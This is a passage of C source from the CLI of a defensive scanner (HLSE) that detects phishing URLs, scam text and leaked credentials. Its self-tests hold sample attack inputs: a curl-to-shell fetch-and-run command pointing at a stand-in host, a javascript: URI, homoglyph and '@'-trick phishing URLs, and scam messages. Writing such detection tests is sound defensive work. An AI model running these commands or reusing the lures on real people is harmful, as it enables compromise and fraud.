/*
 * hlse_cli.c -- the command-line front end of HLSE.
 *
 * Split out of hlse_core.c, which keeps the detection engine and the public
 * API. This file holds everything that used to sit inside that file's
 * `#ifndef HLSE_CORE_AS_LIB` block: the subcommand handlers (`cmd_*`), their
 * helpers, the SARIF / baseline / --fail-on state, and main(). It is linked
 * into the `hlse_core` executable only -- never into libhlse.so, the server,
 * the unit tests or the fuzzers, which is what keeps the library free of CLI
 * code without a preprocessor guard.
 *
 * The move is verbatim; the only non-move edits are the internal-linkage
 * keywords dropped from the few engine helpers this file calls, which are now
 * declared in hlse_core_internal.h.
 */
#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <ctype.h>
#include <stddef.h>
#include <stdint.h>
#include <math.h>

#include "hlse_core.h"   /* Verdict, ScanResult, public API declarations */
#include "hlse_text.h"   /* TextVerdict, hlse_check_text */
#include "hlse_protect.h" /* ProtectionVerdict, hlse_protect_scan */
#include "hlse_util.h"    /* hlse_shannon_entropy, hlse_edit_distance */
#include "hlse_supply.h"  /* PackageVerdict, PasteVerdict, NetworkVerdict */
#include "hlse_file.h"    /* FileVerdict, hlse_check_file */
#include "hlse_audit.h"   /* AuditVerdict, hlse_audit_all */
#include "hlse_secrets.h"  /* SecretVerdict, hlse_scan_secrets */
#include "hlse_alert.h"    /* hlse_alert_init/emit/shutdown */

#include <sys/stat.h>
#include <sys/wait.h>     /* waitpid — reap the `git log` child (P0-2) */
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include "hlse_core_internal.h"

#define HLSE_BUILD_DATE    __DATE__

/* ───────────────── blast-radius / asset-class correlation ─────────────────
 * A leaked credential's danger is not its count but what the *set* of leaked
 * credentials collectively unlocks. We bucket each secret-finding type into a
 * coarse asset class; when a scan turns up credentials spanning two or more
 * classes, an attacker can pivot across systems (code → cloud → data), which
 * is materially worse than many tokens of a single class. */
enum {
    ASSET_CLOUD    = 1 << 0,   /* AWS/GCP/Azure/DO infrastructure          */
    ASSET_SCM      = 1 << 1,   /* GitHub/GitLab source control             */
    ASSET_DATABASE = 1 << 2,   /* DB / service connection-string creds     */
    ASSET_PAYMENT  = 1 << 3,   /* Stripe/PayPal/Square                     */
    ASSET_COMMS    = 1 << 4,   /* Slack/Discord/Telegram/SendGrid/Twilio   */
    ASSET_AI       = 1 << 5,   /* OpenAI/Anthropic/Groq/… provider keys    */
    ASSET_CRYPTO   = 1 << 6    /* SSH/PGP private keys                      */
};

/* CLI-only (scan/secret blast-radius reporting); marked unused so the
 * library build, which excludes the CLI, does not warn. */
static unsigned
asset_class_of(const char *type) {
    if (!type) return 0;
    if (strstr(type, "AWS") || strstr(type, "GCP") || strstr(type, "Google") ||
        strstr(type, "AZURE") || strstr(type, "Azure") ||
        strstr(type, "DigitalOcean") || strstr(type, "Databricks") ||
        strstr(type, "Render") || strstr(type, "Fly.io") ||
        strstr(type, "Vercel") || strstr(type, "Netlify"))
        return ASSET_CLOUD;
    if (strstr(type, "GitHub") || strstr(type, "GitLab"))
        return ASSET_SCM;
    if (strstr(type, "URI_CREDENTIALS") || strstr(type, "Database") ||
        strstr(type, "PlanetScale"))
        return ASSET_DATABASE;
    if (strstr(type, "Stripe") || strstr(type, "PayPal") ||
        strstr(type, "Square"))
        return ASSET_PAYMENT;
    if (strstr(type, "Slack") || strstr(type, "Discord") ||
        strstr(type, "Telegram") || strstr(type, "SendGrid") ||
        strstr(type, "Twilio") || strstr(type, "Postman"))
        return ASSET_COMMS;
    if (strstr(type, "OpenAI") || strstr(type, "Anthropic") ||
        strstr(type, "Groq") || strstr(type, "Perplexity") ||
        strstr(type, "xAI") || strstr(type, "Hugging"))
        return ASSET_AI;
    if (strstr(type, "PRIVATE_KEY") || strstr(type, "Private key"))
        return ASSET_CRYPTO;
    return 0;  /* generic env/JWT/entropy — not pivot-defining */
}

/* Priority action for the threat mix found by a scan pass.
 * Returns a one-sentence triage hint keyed to the highest-severity
 * asset class (or file/URL threats when no credentials were found). */
static const char *
scan_immediate_action(unsigned mask, int nclasses) {
    if (nclasses >= 2)
        return "MULTI-CLASS: rotate ALL leaked credentials immediately \xe2\x80\x94 "
               "an attacker with multiple asset classes can pivot across systems";
    if (mask & ASSET_CLOUD)
        return "rotate all cloud API keys immediately \xe2\x80\x94 cloud access "
               "enables server control, data exfiltration, and billing fraud";
    if (mask & ASSET_PAYMENT)
        return "contact your payment processor to invalidate the leaked key \xe2\x80\x94 "
               "payment keys can be used for fraud within minutes";
    if (mask & ASSET_SCM)
        return "revoke the leaked source control token from repository settings "
               "\xe2\x80\x94 then audit CI/CD pipeline secret access";
    if (mask & ASSET_DATABASE)
        return "rotate database credentials and audit the query log for "
               "unauthorized reads \xe2\x80\x94 database access exposes all records";
    if (mask & ASSET_CRYPTO)
        return "replace the private key and remove it from authorized_keys "
               "on every host that trusts it";
    if (mask & ASSET_AI)
        return "regenerate the API key in the provider dashboard \xe2\x80\x94 "
               "AI provider keys can incur large charges when abused";
    if (mask & ASSET_COMMS)
        return "regenerate the webhook or bot token from the service dashboard";
    return "review per-finding output \xe2\x80\x94 quarantine or delete flagged "
           "files before deploying or sharing";
}

/* CLI-only (scan/secret blast-radius reporting); see asset_class_of above. */
static int
asset_mask_describe(unsigned mask, char *out, size_t outsz) {
    static const struct { unsigned bit; const char *name; } A[] = {
        { ASSET_CLOUD,    "cloud-infrastructure" },
        { ASSET_SCM,      "source-control" },
        { ASSET_DATABASE, "database" },
        { ASSET_PAYMENT,  "payment" },
        { ASSET_COMMS,    "communications" },
        { ASSET_AI,       "AI-provider" },
        { ASSET_CRYPTO,   "private-key" },
        { 0, NULL }
    };
    int i, n = 0;
    size_t w = 0;
    out[0] = '\0';
    for (i = 0; A[i].name; i++) {
        if (mask & A[i].bit) {
            int k = snprintf(out + w, outsz - w, "%s%s",
                             n ? ", " : "", A[i].name);
            if (k > 0 && (size_t)k < outsz - w) w += (size_t)k;
            n++;
        }
    }
    return n;  /* number of distinct asset classes */
}

/* ──────────────────────── output formatting ──────────────────────────── */

/* Used by print_verdict (CLI mode) and exposed for library users.
 * `__attribute__((unused))` silences the warning when only the URL
 * library is used and CLI helpers are excluded.                       */
static const char *
action_for_score(int score) {
    if (score >= 80) return "ISOLATE";
    if (score >= 60) return "BLOCK";
    if (score >= 40) return "ALERT";
    if (score >= 15) return "LOG";
    return "SAFE";
}


/* Stable machine-readable pattern id for a file-masquerade verdict — the file
 * counterpart of hlse_text_pattern_id (P86). Keyed to the prose label computed
 * inline at the file display sites so the same append-only HLSE-FILE-* tokens
 * are emitted everywhere a file `pattern` is shown. Returns "HLSE-FILE-MASQUERADE"
 * for the catch-all masquerade label; never NULL when called with a non-NULL
 * fpat. */
static const char *
file_pattern_id(const char *fpat) {
    if (!fpat) return NULL;
    if (strstr(fpat, "RTL override"))    return "HLSE-FILE-RTL-OVERRIDE";
    if (strstr(fpat, "double-extension")) return "HLSE-FILE-DOUBLE-EXT";
    if (strstr(fpat, "macro"))            return "HLSE-FILE-MACRO";
    if (strstr(fpat, "embedded JavaScript")) return "HLSE-FILE-PDF-JS";
    return "HLSE-FILE-MASQUERADE";
}

/* Stable file pattern_id derived directly from a FileVerdict's first reason —
 * mirrors the prose-label ladder at the file display sites so the SARIF scan
 * path (P91) emits the same HLSE-FILE-* token as the standalone `file` JSON. */
static const char *
file_verdict_pattern_id(const FileVerdict *fv) {
    if (fv->n_reasons > 0) {
        const char *r = fv->reasons[0];
        if (strstr(r, "RLO") || strstr(r, "Unicode"))
            return "HLSE-FILE-RTL-OVERRIDE";
        if (strstr(r, "DOUBLE EXTENSION") || strstr(r, "double"))
            return "HLSE-FILE-DOUBLE-EXT";
        if (strstr(r, "macro") || strstr(r, "Macro"))
            return "HLSE-FILE-MACRO";
        if (strstr(r, "PDF") || strstr(r, "JavaScript"))
            return "HLSE-FILE-PDF-JS";
    }
    return "HLSE-FILE-MASQUERADE";
}

/* Socratic question (Perspective 101): "The same RLO/DOUBLE-EXTENSION/macro/
 * PDF if-else classification ladder is copy-pasted at all four file display
 * sites (standalone `file` JSON, standalone plaintext, `scan`'s embedded-file
 * JSON, `scan`'s embedded-file plaintext) as an inline local `fpat` variable —
 * four independent copies of the same four conditions, right next to the
 * single shared file_verdict_pattern_id() a few lines above that already
 * performs the identical match for the pattern_id token. Four independently
 * maintained copies is exactly how the standalone-vs-scan field asymmetry
 * that Perspective 95 had to fix originally happened. Shouldn't the
 * human-readable label share one function the way the token already does?"
 *
 * Consolidates the four inline copies into one function so pattern label and
 * pattern_id can never again drift apart between the standalone and scan
 * code paths. Pure refactor — every branch and return value is unchanged. */
static const char *
file_classify_pattern(const FileVerdict *fv) {
    if (fv->n_reasons > 0) {
        const char *r = fv->reasons[0];
        if (strstr(r, "RLO") || strstr(r, "Unicode"))
            return "Unicode RTL override trick (hidden file extension)";
        if (strstr(r, "DOUBLE EXTENSION") || strstr(r, "double"))
            return "double-extension file masquerade (disguised executable)";
        if (strstr(r, "macro") || strstr(r, "Macro"))
            return "Office macro delivery (document-based malware lure)";
        if (strstr(r, "PDF") || strstr(r, "JavaScript"))
            return "PDF with embedded JavaScript (drive-by execution lure)";
    }
    return "file masquerade / malicious file delivery";
}

/* The two ALERT-floor (score >= 40) advisory lines for any file-masquerade
 * verdict — identical regardless of which specific pattern fired, so a
 * single pair of accessors (mirroring file_classify_pattern above) replaces
 * the four independently duplicated string literals this used to be. */
static const char *
file_masquerade_objective(void) {
    return "code execution \xe2\x80\x94 opening a disguised executable "
           "or document with macros runs the payload with your "
           "user privileges; the visual disguise is designed to "
           "bypass 'I checked the extension' caution";
}

static const char *
file_masquerade_verify(void) {
    return "do NOT open the file; scan it with a multi-engine "
           "sandbox (e.g. VirusTotal) first \xe2\x80\x94 right-click "
           "to upload; confirm the file came from a trusted source "
           "through a separately-known channel";
}

/* Stable machine-readable pattern id for an exposed-credential verdict — the
 * secret counterpart of hlse_text_pattern_id (P86). Keyed to the credential
 * type label (sv.findings[0].type) so SIEM rules route on a stable HLSE-SECRET-*
 * token instead of the freeform provider string. Returns "HLSE-SECRET-GENERIC"
 * for unrecognised types; never NULL when called with a non-NULL ftype. */
static const char *
secret_pattern_id(const char *ftype) {
    if (!ftype) return NULL;
    if (strstr(ftype, "AWS"))     return "HLSE-SECRET-AWS";
    if (strstr(ftype, "GitHub"))  return "HLSE-SECRET-GITHUB";
    if (strstr(ftype, "Stripe"))  return "HLSE-SECRET-STRIPE";
    if (strstr(ftype, "Slack"))   return "HLSE-SECRET-SLACK";
    if (strstr(ftype, "Google"))  return "HLSE-SECRET-GOOGLE";
    if (strstr(ftype, "OpenAI"))  return "HLSE-SECRET-OPENAI";
    if (strstr(ftype, "Anthropic")) return "HLSE-SECRET-ANTHROPIC";
    if (strstr(ftype, "Azure"))   return "HLSE-SECRET-AZURE";
    if (strstr(ftype, "Private key") || strstr(ftype, "private key"))
                                  return "HLSE-SECRET-PRIVATE-KEY";
    /* Checked before the generic JWT arm: an unsigned token is a distinct
     * finding class (forgeable credential / misconfiguration, not a leak) and
     * deserves its own routing token downstream. */
    if (strstr(ftype, "JWT_ALG_NONE")) return "HLSE-SECRET-JWT-ALG-NONE";
    if (strstr(ftype, "JWT"))     return "HLSE-SECRET-JWT";
    return "HLSE-SECRET-GENERIC";
}

/* ── Pattern-ID registry (Perspective 88) ──────────────────────────────────
 * The stable HLSE-* pattern_id tokens introduced across P78–P87 exist so SIEM
 * and SOAR pipelines can route on an append-only identifier instead of prose
 * that we keep rewording. But a stable token is only useful to automation if
 * the FULL set is discoverable — and until now the universe of tokens could
 * only be learned by grepping this source. `--list-patterns` closes that gap:
 * it emits the authoritative registry (token, kind, prose description) so a
 * consumer can build a complete routing table without reading C.
 *
 * This table is the single source of truth; keep it append-only (never reword
 * or remove a token — that is the whole point) and in sync with the emitters
 * above and in hlse_text_pattern_id / hlse_url_pattern_id.                   */
struct pattern_entry {
    const char *id;    /* stable HLSE-* token                                */
    const char *kind;  /* verdict kind that emits it                         */
    const char *desc;  /* one-line human description                         */
};

static const struct pattern_entry g_pattern_registry[] = {
    /* text / social-engineering attack patterns (hlse_text_pattern_id) */
    { "HLSE-CLICKFIX",            "text", "ClickFix paste-and-run script-injection lure" },
    { "HLSE-OAUTH-DEVICECODE",    "text", "OAuth device-code phishing" },
    { "HLSE-MFA-FATIGUE",         "text", "MFA fatigue / push-bombing" },
    { "HLSE-BEC-PAYMENT-DIVERSION","text","BEC payment / bank-detail diversion" },
    { "HLSE-BEC-CEO",             "text", "BEC CEO-fraud impersonation" },
    { "HLSE-BEC-WIRE",            "text", "BEC wire-transfer fraud" },
    { "HLSE-CALLBACK-TOAD",       "text", "Telephone-oriented attack delivery (callback phishing)" },
    { "HLSE-SEXTORTION",          "text", "Sextortion extortion scam" },
    { "HLSE-INVESTMENT",          "text", "Investment / pig-butchering scam" },
    { "HLSE-ADVANCE-FEE",         "text", "Advance-fee fraud" },
    { "HLSE-PRIZE",               "text", "Prize / lottery scam" },
    { "HLSE-REFUND-SCAM",         "text", "Refund / overpayment scam" },
    { "HLSE-JOB-SCAM",            "text", "Job-offer / task scam" },
    { "HLSE-TECH-SUPPORT",        "text", "Tech-support scam" },
    { "HLSE-QUISHING",            "text", "QR-code phishing (quishing)" },
    { "HLSE-RANSOM",              "text", "Ransom / extortion demand" },
    { "HLSE-FAKE-ALERT",          "text", "Fake security-alert lure" },
    { "HLSE-CRED-LURE",           "text", "Credential-harvest lure" },
    { "HLSE-URGENCY-CRED",        "text", "Urgency + credential request" },
    { "HLSE-AUTHORITY",           "text", "Authority-impersonation pressure" },
    { "HLSE-EMERGENCY",           "text", "Manufactured-emergency pressure" },
    { "HLSE-URGENCY",             "text", "Generic urgency pressure" },
    { "HLSE-GENERIC",             "text", "Recognised text attack, unclassified pattern" },
    /* url / phishing-link patterns (hlse_url_pattern_id) */
    { "HLSE-URL-HOMOGLYPH",       "url",  "Homoglyph / look-alike domain" },
    { "HLSE-URL-IDN-HOMOGRAPH",   "url",  "IDN homograph (mixed-script) domain" },
    { "HLSE-URL-TYPOSQUAT",       "url",  "Typosquat of a known brand domain" },
    { "HLSE-URL-TYPOSQUAT-HARVEST","url", "Typosquat with credential-harvest path" },
    { "HLSE-URL-BRAND",           "url",  "Brand impersonation in domain" },
    { "HLSE-URL-BRAND-RISKY-TLD", "url",  "Brand name on a high-risk TLD" },
    { "HLSE-URL-MULTI-BRAND",     "url",  "Multiple brands co-spoofed in one host" },
    { "HLSE-URL-SUBDOMAIN",       "url",  "Brand placed in subdomain of attacker domain" },
    { "HLSE-URL-SUBDOMAIN-HARVEST","url", "Subdomain brand spoof with harvest path" },
    { "HLSE-URL-HYPHEN-BRAND",    "url",  "Brand-hyphen-securityword phishing host" },
    { "HLSE-URL-HYPHEN-HARVEST",  "url",  "Hyphenated brand host with harvest path" },
    { "HLSE-URL-IP-BRAND",        "url",  "Raw-IP URL impersonating a brand" },
    { "HLSE-URL-CRED-HARVEST",    "url",  "Credential-harvest path pattern" },
    { "HLSE-URL-AT-CRED-TRICK",   "url",  "'@' userinfo credential trick in URL" },
    { "HLSE-URL-SHORTENER",       "url",  "URL shortener masking the destination" },
    { "HLSE-URL-FREEHOST",        "url",  "Free-hosting / abuse-prone provider" },
    { "HLSE-URL-DGA",             "url",  "Algorithmically-generated (DGA) domain" },
    { "HLSE-URL-GENERIC",         "url",  "Recognised URL attack, unclassified pattern" },
    /* file masquerade patterns (file_pattern_id) */
    { "HLSE-FILE-RTL-OVERRIDE",   "file", "Unicode RTL-override filename trick" },
    { "HLSE-FILE-DOUBLE-EXT",     "file", "Double-extension masquerade" },
    { "HLSE-FILE-MACRO",          "file", "Office macro delivery" },
    { "HLSE-FILE-PDF-JS",         "file", "PDF with embedded JavaScript" },
    { "HLSE-FILE-MASQUERADE",     "file", "Generic file masquerade / malicious delivery" },
    /* exposed-credential types (secret_pattern_id) */
    { "HLSE-SECRET-AWS",          "secret", "AWS access key" },
    { "HLSE-SECRET-GITHUB",       "secret", "GitHub token" },
    { "HLSE-SECRET-STRIPE",       "secret", "Stripe API key" },
    { "HLSE-SECRET-SLACK",        "secret", "Slack token" },
    { "HLSE-SECRET-GOOGLE",       "secret", "Google API key" },
    { "HLSE-SECRET-OPENAI",       "secret", "OpenAI API key" },
    { "HLSE-SECRET-ANTHROPIC",    "secret", "Anthropic API key" },
    { "HLSE-SECRET-AZURE",        "secret", "Azure credential" },
    { "HLSE-SECRET-PRIVATE-KEY",  "secret", "Private key (PEM/OpenSSH)" },
    { "HLSE-SECRET-JWT",          "secret", "JSON Web Token" },
    { "HLSE-SECRET-GENERIC",      "secret", "Generic / heuristic credential" },
    /* single-pattern kinds (emitted inline at the kind's BLOCK path) */
    { "HLSE-ESP-BOOTKIT",         "esp",       "UEFI bootkit indicator in EFI System Partition" },
    { "HLSE-PKG-TYPOSQUAT",       "package",   "Dependency-confusion / typosquat supply-chain attack" },
    { "HLSE-NET-C2",             "network",   "Suspicious network activity (C2 / exfiltration)" },
    { "HLSE-CLIP-HIJACK",         "clipboard", "Cryptocurrency clipboard hijack (clipper malware)" },
    { "HLSE-PROTECT-RANSOM",      "protect",   "Ransomware / destructive-malware indicator (file entropy, SMB canary, mass rename)" }
};

/* Emit the full pattern-ID registry. JSON mode → an array of
 * {id, kind, description} objects under a "patterns" key; text mode → an
 * aligned table. Returns 0 (a meta-command, never a failure gate).          */
static int
list_patterns(int json_out) {
    size_t n = sizeof(g_pattern_registry) / sizeof(g_pattern_registry[0]);
    size_t i;
    if (json_out) {
        /* The registry strings are author-controlled constants (ASCII, no
         * quotes/backslashes/control chars), so they need no JSON escaping —
         * keeping this self-contained and free of a forward reference to
         * json_escape, which is defined later in the file. */
        printf("{\"kind\":\"pattern_registry\",\"hlse_version\":\"" HLSE_VERSION
               "\",\"count\":%zu,\"patterns\":[", n);
        for (i = 0; i < n; i++) {
            printf("%s{\"id\":\"%s\",\"kind\":\"%s\",\"description\":\"%s\"}",
                   i > 0 ? "," : "",
                   g_pattern_registry[i].id,
                   g_pattern_registry[i].kind,
                   g_pattern_registry[i].desc);
        }
        printf("]}\n");
    } else {
        printf("HLSE pattern_id registry (%zu stable tokens, append-only)\n", n);
        for (i = 0; i < n; i++)
            printf("  %-28s [%-9s] %s\n",
                   g_pattern_registry[i].id,
                   g_pattern_registry[i].kind,
                   g_pattern_registry[i].desc);
    }
    return 0;
}


static int
self_test(void) {
    int pass = 0, fail = 0;

    struct test_case {
        const char *url;
        int min_score;
        int max_score;
        const char *desc;
    };

    /* These cases are derived directly from the Rust v0.7 corpus. */
    struct test_case cases[] = {
        /* Homoglyph attacks */
        { "https://g00gle.com",                         40, 80,
          "Digit-substitution homoglyph" },
        { "https://paypa1.com",                         40, 80,
          "1-for-l homoglyph" },
        { "https://paypaII.com",                        40, 80,
          "Capital-I-for-l homoglyph" },
        /* Suspicious TLD */
        { "https://secure-net-fix.top/update",          25, 80,
          "Suspicious TLD + hyphenation" },
        /* Subdomain spoofing */
        { "https://paypal.com.attacker.xyz/verify",     50, 100,
          "Subdomain brand spoof" },
        { "https://apple.com.id-locked.top/unlock",     45, 100,
          "Subdomain spoof + suspicious TLD" },
        /* Phishing path */
        { "https://random.xyz/verify/account/signin",   30, 100,
          "Multiple phishing path patterns + sus TLD" },
        /* Dangerous URI */
        { "javascript:alert(1)",                        80, 100,
          "javascript: URI" },
        /* False positives — must NOT fire */
        { "https://github.com/anthropics/sdk",           0, 14,
          "Legit GitHub URL" },
        { "https://docs.google.com/document/d/1/edit",   0, 14,
          "Legit Google Docs" },
        { "https://en.wikipedia.org/wiki/Verify",        0, 14,
          "Wikipedia article happens to mention 'verify'" },
        { "https://mail.google.com/mail/u/0",            0, 14,
          "Legit Gmail subdomain" },
        { "https://www.paypal.com/signin",               0, 39,
          "Real PayPal — has 'signin' in path but legit" },
        { "https://paypal-verify.com/account",            40, 100,
          "Brand-hyphen phishing: paypal-verify" },
        { "https://apple-support.net/signin",             40, 100,
          "Brand-hyphen phishing: apple-support" },
        { "https://x7k2p9qzr4mw.com/login",               40, 100,
          "DGA: high-entropy random domain with digits" },
        /* IDN homograph via Punycode (xn--) — decode then confusable-fold */
        { "https://xn--pple-43d.com",                     60, 100,
          "IDN homograph: xn--pple-43d = аpple (Cyrillic a)" },
        { "https://xn--ggle-55da.com",                    60, 100,
          "IDN homograph: xn--ggle-55da = gооgle (Cyrillic o)" },
        { "https://xn--pypl-53dc.com",                    60, 100,
          "IDN homograph: xn--pypl-53dc = pаypаl (Cyrillic a)" },
        { "https://xn--mirosoft-gch.com",                 60, 100,
          "IDN homograph: xn--mirosoft-gch = miсrosoft (Cyrillic c)" },
        /* Brand-token FP guard — short brand "line" must not match "airline" */
        { "https://airline-update.com/flights",            0, 39,
          "FP guard: 'airline' must not match brand 'line'" },
        /* @ credential trick */
        { "https://google.com@evil.com/verify",           45, 100,
          "@ credential trick detected" },
        /* URL shorteners */
        { "https://bit.ly/3xYzAbc",                        15, 39,
          "URL shortener: bit.ly scores LOG (destination hidden)" },
        /* Free-hosting phishing */
        { "https://paypal-verify.netlify.app/login",       50, 100,
          "Free-hosting phishing: brand in netlify.app subdomain" },
        { "https://myapp.netlify.app/home",                 0, 25,
          "FP guard: legitimate app on netlify.app without brand" },
        /* Legitimate IDNs — must NOT be flagged as homographs (UTS-39) */
        { "https://xn--mnchen-3ya.com",                    0, 14,
          "Legit IDN: xn--mnchen-3ya = münchen (German, single-script)" },
        { "https://xn--wgv71a.com",                        0, 14,
          "Legit IDN: xn--wgv71a = 日本 (Japanese, single-script)" },
        { "https://xn--e1afmkfd.com",                      0, 14,
          "Legit IDN: xn--e1afmkfd = пример (pure Cyrillic, not a brand)" },
        /* New brands: security software, tax software */
        { "https://norton-verify.click/account",           60, 100,
          "New brand 'norton' + suspicious TLD + phishing path" },
        { "https://turbotax-update.xyz/signin",            60, 100,
          "New brand 'turbotax' + suspicious TLD + phishing path" },
        /* New path patterns: CMS admin */
        { "https://paypal.pages.dev/wp-admin",             80, 100,
          "Free-hosting + brand + /wp-admin path" },
        /* Raw (non-Punycode) UTF-8 homoglyphs — folded via cp_fold().
         * Greek omicron (U+03BF) was previously collapsed to '?' and
         * missed; now folds to 'o' and matches the brand.              */
        { "https://g\xce\xbf\xce\xbfgle.com",             40, 100,
          "Raw UTF-8 Greek-omicron homoglyph: gοοgle → google" },
        { "https://paypa\xd3\x8f.com/login",              40, 100,
          "Raw UTF-8 Cyrillic-palochka homoglyph: paypaӏ → paypal" },
        /* Armenian homoglyphs — cp_fold now covers U+0561/0565/0578/0570 */
        { "https://\xd5\xa1pple.com",                     60, 100,
          "Raw UTF-8 Armenian-Ayb homoglyph: \xd5\xa1pple → apple" },
        { "https://g\xd5\xb8\xd5\xb8gle.com",            60, 100,
          "Raw UTF-8 Armenian-Vo homoglyph: g\xd5\xb8\xd5\xb8gle → google" },
        /* Cyrillic Komi De (U+0501) → 'd' */
        { "https://\xd4\x81iscord.com",                   60, 100,
          "Raw UTF-8 Cyrillic-Komi-De homoglyph: \xd4\x81iscord → discord" },
        /* Greek chi/omega (U+03C7/03C9) — newly mapped */
        { "https://\xcf\x89hatsapp.com",                  60, 100,
          "Raw UTF-8 Greek-omega homoglyph: \xcf\x89hatsapp → whatsapp" },
        /* Subdomain spoofing + phishing-typical SLD (security word + hyphen) */
        { "https://apple.com.id-login.net/appleid",        60, 100,
          "Subdomain spoof + phishing SLD (login) = BLOCK" },
        /* brand-hyphen alone on .net (no suspicious TLD, no path) — still ALERT */
        { "https://paypal-verify.net",                     20, 59,
          "FP calibration: brand-hyphen alone without sus TLD/path stays below BLOCK" },
    };
    int n = sizeof(cases) / sizeof(cases[0]);
    int i;

    printf("Running %d test cases...\n\n", n);

    for (i = 0; i < n; i++) {
        Verdict v = check_url(cases[i].url);
        int ok = (v.score >= cases[i].min_score
                  && v.score <= cases[i].max_score);
        printf("%s [%3d in %d..%d]  %-50s  %s\n",
               ok ? "PASS" : "FAIL",
               v.score, cases[i].min_score, cases[i].max_score,
               cases[i].url, cases[i].desc);
        if (!ok) {
            int j;
            for (j = 0; j < v.n_reasons; j++) {
                printf("       reason: %s\n", v.reasons[j]);
            }
            fail++;
        } else {
            pass++;
        }
    }

    printf("\n%d passed, %d failed\n", pass, fail);
    return fail == 0 ? 0 : 1;
}

/* ──────────────────────── corpus benchmark ──────────────────────────── */

static int
benchmark(void) {
    static const char *malicious[] = {
        "https://g00gle.com/accounts/signin",
        "https://g00gle-security.top/verify",
        "https://paypa1.com/signin",
        "https://paypaII.com/signin",
        "https://gogle.com/signin",
        "https://amzaon.com/account",
        "https://mіcrosoft.com/signin",        /* Cyrillic */
        "https://paypal.com.secure-update-verify.xyz/signin",
        "https://netflix.com.billing-update.online/login",
        "https://apple.com.id-locked-verify.top/unlock",
        "https://amazon.com.account-security-alert.xyz/verify",
        "https://random-domain-98127.xyz/account/verify/urgent",
        "https://secureaccount.top/paypal/signin/verify-identity",
        "https://webmail-reset.click/office365/login",
        "https://document-secure-view.xyz/docusign/verify",
        /* Japanese phishing */
        "https://rakuten.co.jp.security-alert.xyz/login",
        "https://amazon.co.jp.account-verify.top/signin",
        "https://my.softbank.jp.account-suspended.online/reactivate",
        NULL
    };
    static const char *legit[] = {
        "https://github.com",
        "https://github.com/anthropics/sdk",
        "https://google.com",
        "https://mail.google.com/mail/u/0",
        "https://docs.google.com/document/d/1/edit",
        "https://microsoft.com",
        "https://learn.microsoft.com/en-us/azure",
        "https://apple.com",
        "https://docs.rs/tokio",
        "https://crates.io/crates/serde",
        "https://stackoverflow.com/questions/49937",
        "https://en.wikipedia.org/wiki/Rust_(programming_language)",
        "https://en.wikipedia.org/wiki/Verify",
        "https://www.paypal.com/signin",
        "https://www.chase.com/personal/credit-cards",
        /* Japanese legitimate */
        "https://www.rakuten.co.jp",
        "https://www.amazon.co.jp",
        "https://www.nhk.or.jp/news",
        NULL
    };

    int n_mal = 0, n_legit = 0;
    int detected = 0, fp = 0;
    int i;

    for (i = 0; malicious[i]; i++) {
        Verdict v = check_url(malicious[i]);
        n_mal++;
        if (v.score >= 40) detected++;
        else printf("MISSED %s [%d]\n", malicious[i], v.score);
    }
    for (i = 0; legit[i]; i++) {
        Verdict v = check_url(legit[i]);
        n_legit++;
        if (v.score >= 40) {
            fp++;
            printf("FALSE POSITIVE %s [%d]\n", legit[i], v.score);
        }
    }

    {
        double tp_rate = (double)detected / n_mal;
        double fp_rate = (double)fp / n_legit;
        double precision = (detected + fp) > 0
            ? (double)detected / (detected + fp) : 1.0;
        double recall = tp_rate;
        double f1 = (precision + recall) > 0
            ? 2 * precision * recall / (precision + recall) : 0;

        printf("\n=== Corpus Benchmark ===\n");
        printf("Malicious: %d/%d detected  (%.1f%% recall)\n",
               detected, n_mal, tp_rate * 100);
        printf("Legitimate: %d/%d false positives (%.1f%% FP rate)\n",
               fp, n_legit, fp_rate * 100);
        printf("Precision: %.3f\n", precision);
        printf("Recall:    %.3f\n", recall);
        printf("F1:        %.3f\n", f1);
        printf("\nAcceptance criteria:\n");
        printf("  recall >= 0.85    %s\n", recall >= 0.85 ? "PASS" : "FAIL");
        printf("  fp_rate <= 0.05   %s\n", fp_rate <= 0.05 ? "PASS" : "FAIL");
        printf("  F1 >= 0.85        %s\n", f1 >= 0.85 ? "PASS" : "FAIL");

        return (recall >= 0.85 && fp_rate <= 0.05 && f1 >= 0.85) ? 0 : 1;
    }
}

/* ─────────────────────────── text scam tests ────────────────────────── */

#include "hlse_text.h"

static int
text_self_test(void) {
    int pass = 0, fail = 0;
    int i;

    struct text_case {
        const char *input;
        int min_score;
        int max_score;
        const char *desc;
    };
    struct text_case cases[] = {
        /* MUST FIRE */
        { "URGENT: Buy $200 iTunes gift cards immediately to unlock your account",
          50, 100, "Tech-support scam" },
        { "This is urgent. Please wire $50,000 to this account immediately",
          40, 100, "BEC wire fraud" },
        { "Congratulations! You have won $10,000. Claim your prize now",
          30, 100, "Lottery scam" },
        { "Don't tell anyone, but send me the gift card code now",
          40, 100, "Grooming + bait" },
        { "Your files have been encrypted. Send 1 BTC to bc1q9h6tq358tcssvfjafy2dajfu7lk6f35c9cn3t2",
          50, 100, "Ransomware demand" },
        { "Microsoft Support: Your PC has a virus. Call us at +1-888-FAKE-NUM now",
          50, 100, "Tech support scam" },
        { "Hi sweetie, I'm investing for you. Send Bitcoin and I'll 3x it",
          50, 100, "Pig butchering opener" },
        { "IRS notice: You owe $3,400 in back taxes. Pay immediately to avoid arrest",
          40, 100, "IRS impersonation" },
        { "Install with: curl -fsSL https://sus.xyz/setup.sh | sh",
          40, 100, "curl|sh supply-chain" },
        { "This is the CEO. Wire $25000 to this account immediately and "
          "keep it confidential.",
          60, 100, "CEO-fraud BEC (authority+wire+secrecy)" },
        /* BEC — 'as the ceo' + wire variant */
        { "As the CEO, please wire the initial payment today. "
          "Don't loop in anyone else.",
          40, 100, "BEC: 'as the ceo' + wire payment + secrecy" },
        /* IRS FP regression: 'first' must NOT trigger authority impersonation */
        { "Hello new friend! I am a doctor working overseas. "
          "A small test transaction first.",
          0, 60, "Pig-butchering: 'first' must not fire authority via 'irs' substring" },
        /* Smishing delivery */
        { "Your package has been held. Click to pay the customs clearance fee.",
          20, 60, "Delivery smishing: customs clearance pattern" },
        /* MUST NOT FIRE */
        { "Meeting at 3pm tomorrow", 0, 14, "Plain calendar" },
        { "Can you review the PR by end of day?", 0, 14, "Plain dev message" },
        { "Let's grab coffee this afternoon", 0, 14, "Plain casual" },
        { "I have a bank account at Chase", 0, 14, "Single bait word in legit context" },
        { "The encryption key rotation should happen every 90 days", 0, 30,
